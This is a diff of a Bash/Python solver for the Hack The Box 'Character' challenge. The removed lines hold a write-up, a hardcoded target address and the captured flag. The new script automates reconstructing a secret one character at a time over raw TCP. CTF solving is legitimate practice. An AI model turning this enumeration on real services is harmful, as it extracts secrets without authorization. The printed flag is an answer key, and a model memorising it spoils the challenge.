@@ -1,104 +1,271 @@
 #!/usr/bin/env bash
-
 set -euo pipefail
 
-# Challenge: Character
-# Platform: Hack The Box
-# Category: terminal / warmup
-# Difficulty: very easy
+# -----------------------------------------------------------------------------
+# PoC: Hack The Box - Character
+# Type: Incremental secret disclosure (one character per index request)
+# Transport: Raw TCP
 #
-# Scenario idea:
-# The service tries to be "secure through boredom" by only revealing one
-# character of the flag at a time. In the real world, this is a classic lesson:
-# partial disclosure is still disclosure. If an attacker can ask the same
-# question repeatedly with different offsets, they can reconstruct the entire
-# secret.
-#
-# What the service does:
-# - It asks for an integer index.
-# - It returns the flag character at that index.
-# - It repeats until the index is out of range.
-#
-# Why this is vulnerable:
-# Returning secret material one byte or one character at a time is still a data
-# leak. The defense only slows down a human; it does not stop automation.
-#
-# Manual solve idea:
-# 1. Connect to the service with nc.
-# 2. Ask for index 0, then 1, then 2, and so on.
-# 3. Keep appending the returned characters.
-# 4. Stop when the service says the index is out of range.
-#
-# Example manual command:
-# nc 154.57.164.67 31512
-#
-# Automation idea:
-# Use a small script that keeps one connection open, sends increasing indexes,
-# parses "Character at Index N: X", and stops once "Index out of range!" appears.
-#
-# Final flag obtained:
-# HTB{tH15_1s_4_r3aLly_l0nG_fL4g_i_h0p3_f0r_y0Ur_s4k3_tH4t_y0U_sCr1pTEd_tH1s_oR_els3_iT_t0oK_qU1t3_l0ng!!}
+# This script is intended for authorized CTF infrastructure only.
+# -----------------------------------------------------------------------------
 
-HOST="154.57.164.67"
-PORT="31512"
+readonly SCRIPT_NAME="$(basename "$0")"
+readonly DEFAULT_TIMEOUT=8
+readonly DEFAULT_MAX_INDEX=500
 
-python3 - <<'PY'
+HOST=""
+PORT=""
+TIMEOUT="${DEFAULT_TIMEOUT}"
+MAX_INDEX="${DEFAULT_MAX_INDEX}"
+VERBOSE=0
+JSON_OUTPUT=0
+
+usage() {
+  cat <<EOF
+Usage:
+  ${SCRIPT_NAME} <host> <port>
+  ${SCRIPT_NAME} --host <host> --port <port> [options]
+
+Options:
+  --host <host>          Target host or IP address
+  --port <port>          Target TCP port
+  --timeout <seconds>    Socket timeout in seconds (default: ${DEFAULT_TIMEOUT})
+  --max-index <n>        Maximum index attempts (default: ${DEFAULT_MAX_INDEX})
+  --json                 Print result as JSON
+  --verbose              Enable verbose debug output
+  -h, --help             Show this help message
+
+Exit codes:
+  0  Success (flag extracted)
+  1  Generic failure
+  2  Invalid arguments
+  3  Connectivity failure
+  4  Protocol parse failure
+  5  No HTB flag pattern detected
+EOF
+}
+
+log_info() {
+  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[*] %s\n' "$*" >&2
+  fi
+}
+
+log_debug() {
+  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[D] %s\n' "$*" >&2
+  fi
+}
+
+log_ok() {
+  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
+    printf '[+] %s\n' "$*" >&2
+  fi
+}
+
+log_error() {
+  printf '[-] %s\n' "$*" >&2
+}
+
+validate_port() {
+  if ! [[ "${PORT}" =~ ^[0-9]+$ ]]; then
+    log_error "Port must be numeric: ${PORT}"
+    exit 2
+  fi
+  if (( PORT < 1 || PORT > 65535 )); then
+    log_error "Port out of range (1-65535): ${PORT}"
+    exit 2
+  fi
+}
+
+validate_max_index() {
+  if ! [[ "${MAX_INDEX}" =~ ^[0-9]+$ ]]; then
+    log_error "max-index must be numeric: ${MAX_INDEX}"
+    exit 2
+  fi
+  if (( MAX_INDEX < 1 )); then
+    log_error "max-index must be >= 1"
+    exit 2
+  fi
+}
+
+parse_args() {
+  local positional=()
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      --host)
+        HOST="${2:-}"
+        shift 2
+        ;;
+      --port)
+        PORT="${2:-}"
+        shift 2
+        ;;
+      --timeout)
+        TIMEOUT="${2:-}"
+        shift 2
+        ;;
+      --max-index)
+        MAX_INDEX="${2:-}"
+        shift 2
+        ;;
+      --json)
+        JSON_OUTPUT=1
+        shift
+        ;;
+      --verbose)
+        VERBOSE=1
+        shift
+        ;;
+      -h|--help)
+        usage
+        exit 0
+        ;;
+      -*)
+        log_error "Unknown option: $1"
+        usage >&2
+        exit 2
+        ;;
+      *)
+        positional+=("$1")
+        shift
+        ;;
+    esac
+  done
+
+  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
+    HOST="${positional[0]}"
+  fi
+  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
+    PORT="${positional[1]}"
+  fi
+
+  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
+    log_error "Host and port are required."
+    usage >&2
+    exit 2
+  fi
+}
+
+main() {
+  parse_args "$@"
+  validate_port
+  validate_max_index
+
+  log_info "Target: ${HOST}:${PORT}"
+  log_info "Extracting flag character-by-character..."
+
+  local output
+  if ! output="$(python3 - "${HOST}" "${PORT}" "${TIMEOUT}" "${MAX_INDEX}" "${VERBOSE}" <<'PY'
+import json
 import re
 import socket
+import sys
 
-HOST = "154.57.164.67"
-PORT = 31512
+host = sys.argv[1]
+port = int(sys.argv[2])
+timeout = float(sys.argv[3])
+max_index = int(sys.argv[4])
+verbose = sys.argv[5] == "1"
 
-sock = socket.create_connection((HOST, PORT), timeout=8)
-sock.settimeout(2)
+try:
+    sock = socket.create_connection((host, port), timeout=timeout)
+except OSError as exc:
+    print(f"ERR_CONNECT:{exc}")
+    sys.exit(3)
 
-# Consume the initial prompt shown by the service.
-sock.recv(4096)
+sock.settimeout(timeout)
 
-flag = ""
+try:
+    try:
+        banner = sock.recv(4096).decode("latin1", "replace")
+    except socket.timeout:
+        banner = ""
+    if verbose:
+        print(f"DBG_BANNER:{banner!r}")
 
-for idx in range(200):
-    sock.sendall(f"{idx}\n".encode())
-    out = ""
+    chars = []
 
-    while True:
-        try:
-            chunk = sock.recv(4096).decode("latin1", "replace")
-        except socket.timeout:
+    for idx in range(max_index):
+        sock.sendall(f"{idx}\n".encode())
+        out = ""
+
+        for _ in range(8):
+            try:
+                chunk = sock.recv(4096).decode("latin1", "replace")
+            except socket.timeout:
+                break
+            if not chunk:
+                break
+            out += chunk
+
+            if "Index out of range" in out:
+                break
+            if f"Character at Index {idx}:" in out:
+                sock.settimeout(0.12)
+                try:
+                    out += sock.recv(4096).decode("latin1", "replace")
+                except Exception:
+                    pass
+                finally:
+                    sock.settimeout(timeout)
+                break
+
+        if "Index out of range" in out:
             break
 
-        out += chunk
-
-        if "Character at Index" in out or "out of range" in out:
-            # The service often sends the result and the next prompt in two
-            # separate packets. Pull one short follow-up read to stabilize the
-            # parser, then continue.
+        m = re.search(rf"Character at Index {idx}: (.)", out)
+        if not m:
             try:
-                sock.settimeout(0.2)
                 out += sock.recv(4096).decode("latin1", "replace")
             except Exception:
                 pass
-            finally:
-                sock.settimeout(2)
-            break
+            m = re.search(rf"Character at Index {idx}: (.)", out)
 
-    if "out of range" in out:
-        break
+        if not m:
+            print(f"ERR_PARSE:{idx}:{out!r}")
+            sys.exit(4)
 
-    match = re.search(r"Character at Index \d+: (.)", out)
-    if not match:
-        # Sometimes we only receive the prompt first. Read once more and retry.
-        try:
-            sock.settimeout(2)
-            out += sock.recv(4096).decode("latin1", "replace")
-        except Exception:
-            pass
-        match = re.search(r"Character at Index \d+: (.)", out)
-        if not match:
-            raise SystemExit(f"Could not parse reply for index {idx!r}: {out!r}")
+        chars.append(m.group(1))
+        if verbose:
+            print(f"DBG_IDX:{idx}:{m.group(1)!r}")
 
-    flag += match.group(1)
+    flag = "".join(chars)
+    if not re.search(r"HTB\{[^}]+\}", flag):
+        print(f"ERR_NOFLAG:{flag}")
+        sys.exit(5)
 
-sock.close()
-print(flag)
+    print(f"OK_FLAG:{flag}")
+finally:
+    try:
+        sock.close()
+    except Exception:
+        pass
 PY
+)"; then
+    case "$?" in
+      3) log_error "Could not connect to target."; exit 3 ;;
+      4) log_error "Failed to parse service response."; exit 4 ;;
+      5) log_error "Extraction completed but HTB pattern was not found."; exit 5 ;;
+      *) log_error "Unexpected extractor failure."; exit 1 ;;
+    esac
+  fi
+
+  log_debug "Extractor output: ${output}"
+  local flag
+  flag="$(printf '%s\n' "${output}" | sed -n 's/^OK_FLAG://p' | tail -n 1)"
+
+  if [[ -z "${flag}" ]]; then
+    log_error "No flag extracted."
+    exit 5
+  fi
+
+  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
+    printf '{"target":"%s:%s","flag":"%s"}\n' "${HOST}" "${PORT}" "${flag}"
+  else
+    log_ok "Flag extracted successfully."
+    printf '%s\n' "${flag}"
+  fi
+}
+
+main "$@"
